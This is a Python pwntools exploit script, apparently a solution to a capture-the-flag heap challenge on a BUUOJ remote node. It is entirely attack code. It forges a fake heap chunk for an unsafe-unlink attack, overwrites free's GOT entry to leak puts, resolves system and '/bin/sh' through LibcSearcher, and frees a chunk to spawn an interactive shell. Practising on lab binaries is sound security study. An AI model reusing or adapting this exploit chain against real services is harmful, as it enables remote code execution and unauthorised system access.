from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27603)
elf = ELF('./pwn')

chunks = 0x602140

def add_chunk(size):
    io.sendline(b'1')
    io.sendline(str(size).encode())

def write_chunk(index, size, content):
    io.sendline(b'2')
    io.sendline(str(index).encode())
    io.sendline(str(size).encode())
    io.send(content)

def delete_chunk(index):
    io.sendline(b'3')
    io.sendline(str(index).encode())

def feedback(index):
    io.sendline(b'4')
    io.sendline(str(index).encode())

add_chunk(0x80) # chunk 0
io.recvuntil(b'OK\n')
add_chunk(0x80) # chunk 1
io.recvuntil(b'OK\n')
add_chunk(0x80) # chunk 2
io.recvuntil(b'OK\n')
add_chunk(0x80) # chunk 3
io.recvuntil(b'OK\n')
add_chunk(0x80) # chunk 4
io.recvuntil(b'OK\n')
payload = p64(0x10)
payload += p64(0x81)
payload += p64(chunks + 8*2 - 0x18)
payload += p64(chunks + 8*2 - 0x10)
payload += cyclic(0x60)
payload += p64(0x80)
payload += p64(0x90)
write_chunk(2, 0x90, payload)
io.recvuntil(b'OK\n')
delete_chunk(3)
io.recvuntil(b'OK\n')
write_chunk(2, 0x10, p64(0) + p64(elf.got['free']))
io.recvuntil(b'OK\n')
write_chunk(0, 0x8, p64(elf.plt['printf']))
io.recvuntil(b'OK\n')
write_chunk(2, 0x10, p64(0) + p64(elf.got['puts']))
io.recvuntil(b'OK\n')
delete_chunk(0)
puts = u64(io.recv(6) + b'\x00\x00')
print(hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
write_chunk(2, 0x10, p64(0) + p64(elf.got['free']))
io.recvuntil(b'OK\n')
write_chunk(0, 0x8, p64(sys))
io.recvuntil(b'OK\n')
write_chunk(4, 0x7, b'/bin/sh')
delete_chunk(4)
io.interactive()